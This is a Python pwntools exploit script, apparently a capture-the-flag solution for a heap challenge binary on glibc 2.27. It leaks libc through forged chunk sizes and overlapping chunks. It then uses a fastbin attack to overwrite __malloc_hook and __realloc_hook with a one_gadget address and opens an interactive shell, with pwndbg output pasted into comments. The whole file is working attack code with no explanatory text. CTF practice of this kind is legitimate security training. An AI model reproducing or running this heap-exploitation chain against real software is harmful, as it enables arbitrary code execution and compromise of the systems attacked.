#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
import os
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
def debug():
    if local == 0:
        return
    binaryname = 'pwn'
    interruptPoint=[0xdcc, 0x11f8]
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[0])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFaddr = 0
    libcaddr = 0
    for inf in maps.readlines():
        if ELFaddr == 0:
            if binaryname in inf:
                ELFaddr = int(inf.split('-', 1)[0], 16)
        if libcaddr == 0:
            if 'libc' in inf:
                libcaddr = int(inf.split('-', 1)[0], 16)
    info('pid : {}'.format(pid))
    success('elfbase', ELFaddr)
    success('libcbase', libcaddr)
    if len(interruptPoint) :
        for p in interruptPoint:
            success('interruptPoint', p+ELFaddr)
    raw_input('debug>')

local = 1
if local:# docker
    io = process('./pwn')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    mallochook = 0x3ebc30
    reallochook = 0x3ebc28
    mainarena = 0x3ebc40
    onegadget = 0x4f322
else:
    target = ''
    ip,port = target.split(':', 1)[0], eval(target.split(':', 1)[1])
    io = remote(ip, port)
    libc = ELF('../libc-2.27-x64.so')
    mallochook = 0x3ebc30
    reallochook = 0x3ebc28
    mainarena = 0x3ebc40
    onegadget = 0x4f2c5

def add(size):
    io.sendlineafter('Command: ', '1')
    io.sendlineafter('Size: ', str(size))

def fill(index, size, content):
    io.sendlineafter('Command: ', '2')
    io.sendlineafter('Index: ', str(index))
    io.sendlineafter('Size: ', str(size))
    content = content.ljust(size, '\x00')
    io.sendafter('Content: ', content)

def dele(index):
    io.sendlineafter('Command: ', '3')
    io.sendlineafter('Index: ', str(index))

def dump(index):
    io.sendlineafter('Command: ', '4')
    io.sendlineafter('Index: ', str(index))

if __name__ == '__main__':
    
    # waste tcache at first
    # calloc doesn't use tcache
    for j in range(1, 9):
        for i in range(7):
            add(j*0x10)
        for i in range(7):
            dele(i)
    # tcache is full now
    # debug()
    for i in range(2):
        add(0x10) # 0 1
    payload = 'a' * 0x10 + p64(0) + p64(0x61)
    fill(0, 0x20, payload)
    for i in range(3):
        add(0x10) # 2 3 4
    for i in range(2):
        add(0x20) # 5 6
    
    dele(1)
    add(0x50) # 1
    payload = 'a' * 0x10 + p64(0) + p64(0x91) + 'b' * 0x10 + p64(0) + p64(0x20)
    fill(1, 0x40, payload)    
    # debug()
    dele(2) # 2 is empty
    dump(1)
    io.recvuntil(p64(0x91))
    arena = u64(io.recv(8))-96
    libcbase = arena - mainarena
    success('libcbase', libcbase)
    libc.address = libcbase
    sys = libc.sym['system']
    onegadget += libcbase
    success('onegadget', onegadget)
    # debug()
    add(0x80) # 2

    '''
pwndbg> x/50xb 0x7fcdcc3cfc0d
0x7fcdcc3cfc0d <_IO_wide_data_0+301>:	0x00	0x00	0x00	0x60	0xbd	0x3c	0xcc	0xcd
0x7fcdcc3cfc15 <_IO_wide_data_0+309>:	0x7f	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7fcdcc3cfc1d:	0x00	0x00	0x00	0x40	0xdb	0x09	0xcc	0xcd
0x7fcdcc3cfc25 <__memalign_hook+5>:	0x7f	0x00	0x00	0xb0	0xe0	0x09	0xcc	0xcd
0x7fcdcc3cfc2d <__realloc_hook+5>:	0x7f	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7fcdcc3cfc35 <__malloc_hook+5>:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7fcdcc3cfc3d:	0x00	0x00

    '''
    payload = 'a' * 0x10 + p64(0) + p64(0x71) + 'b' * 0x10 + p64(0) + p64(0x20)
    payload += 'c' * 0x10 + p64(0) + p64(0x30)
    fill(2, 0x60, payload)
    dele(3)
    mallochook += libcbase
    reallochook += libcbase
    target = mallochook+5-0x28
    payload = 'a' * 0x10 + p64(0) + p64(0x71) + p64(target)
    fill(2, 0x28, payload)
    add(0x60) # 3
    success('realloc', libc.sym['realloc'])
    debug()
    add(0x60) # 7 ; __malloc_hook is in this chunk
    '''
pwndbg> pdisass 0x98C30+0x7f0e641ca000
 ► 0x7f0e64262c30 <realloc>       push   r15
   0x7f0e64262c32 <realloc+2>     push   r14
   0x7f0e64262c34 <realloc+4>     push   r13
   0x7f0e64262c36 <realloc+6>     push   r12
   0x7f0e64262c38 <realloc+8>     push   rbp
   0x7f0e64262c39 <realloc+9>     push   rbx
   0x7f0e64262c3a <realloc+10>    sub    rsp, 0x18
   0x7f0e64262c3e <realloc+14>    mov    rax, qword ptr [rip + 0x35238b]
   0x7f0e64262c45 <realloc+21>    mov    rax, qword ptr [rax]
   0x7f0e64262c48 <realloc+24>    test   rax, rax

    '''
    #                  memalign                    realloc                    malloc
    payload = 'bbb' + p64(libc.sym['realloc']) + p64(onegadget) + p64(libc.sym['memalign'])
    fill(7, len(payload), payload)
    # debug()
    add(0x80)
        



    io.interactive()
    io.close()











